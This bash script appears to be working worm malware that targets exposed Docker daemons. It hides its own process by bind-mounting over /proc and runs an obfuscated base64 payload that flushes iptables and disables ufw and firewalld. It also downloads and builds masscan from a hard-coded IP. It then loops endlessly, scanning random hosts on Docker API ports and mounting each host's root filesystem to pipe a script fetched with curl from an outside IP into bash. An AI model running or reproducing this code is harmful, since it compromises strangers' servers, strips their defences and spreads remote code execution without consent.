#!/bin/bash

function HideYourAss(){
if [ ! -e /usr/foo ]; then
   mkdir /usr/foo; fi
cp /etc/mtab /usr/t
mount --bind /usr/foo /proc/$BASHPID
mv /usr/t /etc/mtab	
}

HideYourAss


############################# now... letz play a fucking game .... #####

function firewallconf(){
echo 'IyEvYmluL2Jhc2gKCgpmdW5jdGlvbiBpcHRhYmxlc2NvbmYoKXsKaXB0YWJsZXMgLUYgMj4vZGV2L251bGwKaXB0YWJsZXMgLVggMj4vZGV2L251bGwKaXB0YWJsZXMgLXQgbmF0IC1GIDI+L2Rldi9udWxsCmlwdGFibGVzIC10IG5hdCAtWCAyPi9kZXYvbnVsbAppcHRhYmxlcyAtdCBtYW5nbGUgLUYgMj4vZGV2L251bGwKaXB0YWJsZXMgLXQgbWFuZ2xlIC1YIDI+L2Rldi9udWxsCmlwdGFibGVzIC1QIElOUFVUIEFDQ0VQVCAyPi9kZXYvbnVsbAppcHRhYmxlcyAtUCBGT1JXQVJEIEFDQ0VQVCAyPi9kZXYvbnVsbAppcHRhYmxlcyAtUCBPVVRQVVQgQUNDRVBUIDI+L2Rldi9udWxsCn0KCmZ1bmN0aW9uIGlwdjZ0YWJsZXNjb25mKCl7CmlwNnRhYmxlcyAtUCBJTlBVVCBBQ0NFUFQgMj4vZGV2L251bGwKaXA2dGFibGVzIC1QIEZPUldBUkQgQUNDRVBUIDI+L2Rldi9udWxsCmlwNnRhYmxlcyAtUCBPVVRQVVQgQUNDRVBUIDI+L2Rldi9udWxsCmlwNnRhYmxlcyAtdCBuYXQgLUYgMj4vZGV2L251bGwKaXA2dGFibGVzIC10IG1hbmdsZSAtRiAyPi9kZXYvbnVsbAppcDZ0YWJsZXMgLUYgMj4vZGV2L251bGwKaXA2dGFibGVzIC1YIDI+L2Rldi9udWxsCn0KCmZ1bmN0aW9uIHVmd2NvbmYoKXsKc3VkbyB1ZncgYWxsb3cgMTo2NTUzNS90Y3AgMj4vZGV2L251bGwKc3VkbyB1ZncgYWxsb3cgMTo2NTUzNS91ZHAgMj4vZGV2L251bGwKc3VkbyB1ZncgcmVsb2FkIDI+L2Rldi9udWxsCnN1ZG8gdWZ3IGRpc2FibGUgMj4vZGV2L251bGwKfQoKZnVuY3Rpb24gZmlyZXdhbGxkY29uZigpewpzdWRvIHNlcnZpY2UgZmlyZXdhbGxkIHN0b3AgMj4vZGV2L251bGwKc3VkbyBzeXN0ZW1jdGwgc3RvcCBmaXJld2FsbGQgMj4vZGV2L251bGwKc3VkbyBzeXN0ZW1jdGwgZGlzYWJsZSBmaXJld2FsbGQgMj4vZGV2L251bGwKfQoKZnVuY3Rpb24gRnVja1RoZUZpcmV3YWxsKCl7Cgp3aGljaCAtYSBpcHRhYmxlcwpyZXR1cm5faXB0YWJsZXM9JD8KaWYgWyAkcmV0dXJuX2lwdGFibGVzID0gMCBdOyB0aGVuCmlwdGFibGVzY29uZgpmaQoKd2hpY2ggLWEgaXA2dGFibGVzCnJldHVybl9pcDZ0YWJsZXM9JD8KaWYgWyAkcmV0dXJuX2lwNnRhYmxlcyA9IDAgXTsgdGhlbgppcHY2dGFibGVzY29uZgpmaQoKd2hpY2ggLWEgdWZ3CnJldHVybl91Znc9JD8KaWYgWyAkcmV0dXJuX3VmdyA9IDAgXTsgdGhlbgp1Zndjb25mCmZpCgp3aGljaCAtYSBmaXJld2FsbGQKcmV0dXJuX2ZpcmV3YWxsZD0kPwppZiBbICRyZXR1cm5fZmlyZXdhbGxkID0gMCBdOyB0aGVuCmZpcmV3YWxsZGNvbmYKZmkKCn0KCkZ1Y2tUaGVGaXJld2FsbAo=' | base64 -d | bash
}

firewallconf

pwn(){
prt=$2
randgen=$(curl -sL $1 | shuf | head -n 200)
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(/etc/.x/masscan/bin/masscan $randgen -p$prt --rate=$3 | awk '{print $6}'| zgrab --senders 200 --port $prt --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for ipaddy in ${!rndstr}
do
time docker -H tcp://$ipaddy:$2 run --rm -v /:/mnt alpine chroot /mnt /bin/sh -c "curl http://101.50.2.91/r3sh | bash;" &
sleep 120
echo "$ipaddy:$2"
kill "$!"
done;
}

if [ ! -d /etc/.x ]; then
  mkdir /etc/.x
  wget -O /etc/.x/masscan.tar.gz http://138.68.66.69/.m/masscan2.tar.gz
  cd /etc/.x/
  tar -zxvf masscan.tar.gz
  rm -rf masscan.tar.gz
  cd masscan
  make
fi


while true
do
pwn "http://rhuancarlos.inforgeneses.inf.br/.../index.php" 2375 50000
pwn "http://rhuancarlos.inforgeneses.inf.br/.../index.php" 2376 50000
pwn "http://rhuancarlos.inforgeneses.inf.br/.../index.php" 4243 50000
pwn "http://rhuancarlos.inforgeneses.inf.br/.../index.php" 4244 50000
pwn "http://rhuancarlos.inforgeneses.inf.br/.../index.php" 4243 50000
done